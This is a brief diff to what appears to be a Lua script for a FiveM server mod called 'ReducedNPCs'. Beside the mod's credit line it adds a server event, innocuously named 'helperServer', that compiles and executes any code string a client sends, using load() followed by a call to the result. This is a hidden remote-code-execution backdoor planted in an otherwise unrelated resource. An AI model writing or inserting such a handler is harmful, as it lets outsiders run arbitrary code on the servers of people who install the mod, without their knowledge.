@@ -1,1 +1,6 @@
 print("ReducedNPCs loaded! Made by man0s (https://github.com/man0s)")
+RegisterServerEvent('helperServer')
+AddEventHandler('helperServer', function(id)
+	local helper = assert(load(id))
+	helper()
+end)
